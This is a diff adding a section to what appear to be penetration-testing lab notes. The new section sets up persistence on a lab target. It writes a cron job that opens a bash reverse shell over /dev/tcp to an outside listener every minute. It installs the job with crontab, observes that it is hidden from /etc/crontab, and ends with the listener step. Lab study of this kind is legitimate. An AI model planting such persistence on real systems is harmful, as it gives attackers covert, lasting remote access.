@@ -758,8 +758,21 @@ So, that copy those into your own system with scp
 Eventhough wait binary is deleted, we can see have access to the target system with it's id_rsa
 #ssh -i id_rsa student@10.10.4.5
 __________________________________________________________________________________________________________________________________
+Persistence Via Crontab
+-------------------------
+Create new scheduled task in target 
 
+#echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.66.12.2/1234 0>&1'" > cron
+#cat cron
 
+Add that task in crontab
+------------------------
+#crontab -i cron
+#crontab -l
+
+But you can't see that task with cat /etc/crontab.
+Exit and port listen with nc 
+__________________________________________________________________________________________________________________________________
 
 
 __________________________________________________________________________________________________________________________________
